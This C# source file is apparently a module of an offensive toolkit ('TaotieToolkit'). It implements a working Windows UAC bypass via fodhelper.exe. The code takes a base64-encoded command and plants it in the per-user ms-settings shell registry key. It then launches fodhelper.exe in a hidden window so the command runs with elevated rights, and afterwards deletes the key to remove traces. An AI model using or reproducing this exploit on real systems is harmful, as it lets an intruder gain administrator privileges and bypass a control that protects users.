using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using TaotieToolkit.config;

namespace TaotieToolkit.modules.PrivilegeEscalation
{
    internal class FodHelper : ICommand, ICommandMarker
    {
        public string Name => "FodHelper";
        public string Description => "Bypass UAC via fodhelper.exe, Example:TaotieToolkit FodHelper Y21kIC9jIHN0YXJ0IGNhbGMuZXhl";

        public void Execute(string[] args)
        {
            //Credit: https://github.com/winscripting/UAC-bypass/blob/master/FodhelperBypass.ps1

            //Check if UAC is set to 'Always Notify'
            Utils.AlwaysNotify();
            
            byte[] encodedCommand = Convert.FromBase64String(args[0]);
            //Convert encoded command to a string
            string command = Encoding.UTF8.GetString(encodedCommand);

            //Set the registry key for fodhelper
            RegistryKey newkey = Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true);
            newkey.CreateSubKey(@"ms-settings\Shell\Open\command");

            RegistryKey fod = Registry.CurrentUser.OpenSubKey(@"Software\Classes\ms-settings\Shell\Open\command", true);
            fod.SetValue("DelegateExecute", "");
            fod.SetValue("", @command);
            fod.Close();

            //start fodhelper
            Process p = new Process();
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.StartInfo.FileName = "C:\\windows\\system32\\fodhelper.exe";
            p.Start();

            //sleep 10 seconds to let the payload execute
            Thread.Sleep(10000);

            //Unset the registry
            newkey.DeleteSubKeyTree("ms-settings");
            return;
        }
    }
}
